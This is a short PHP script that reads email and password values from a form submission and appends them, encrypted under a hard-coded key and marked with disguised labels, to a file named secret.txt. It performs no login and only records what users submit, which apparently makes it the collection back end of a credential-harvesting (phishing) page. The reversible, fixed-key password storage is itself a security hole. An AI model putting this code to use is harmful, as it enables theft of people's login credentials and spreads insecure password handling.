<?php
// Get the email and password values from the POST request
$email = $_POST["email"];
$password = $_POST["password"];

// Get the current date and time
$date = date('Y-m-d H:i:s');

// Define a key for encrypting the file (replace with a secure key)
$key = "my-secret-key";

// Open the file "secret.txt" for appending
$file = fopen("secret.txt", "a");

// Encrypt the email, password, and date/time using OpenSSL
$encrypted_email = openssl_encrypt($email, "AES-256-CBC", $key);
$encrypted_password = openssl_encrypt($password, "AES-256-CBC", $key);
$encrypted_date = openssl_encrypt($date, "AES-256-CBC", $key);

// Write the encrypted data to the file with labels and separators
fwrite($file, "3muil: " . $encrypted_email . "\n P4ssw0rd: " . $encrypted_password . "\n Date/Time: " . $encrypted_date . "\n____\n");

// Close the file
fclose($file);

?>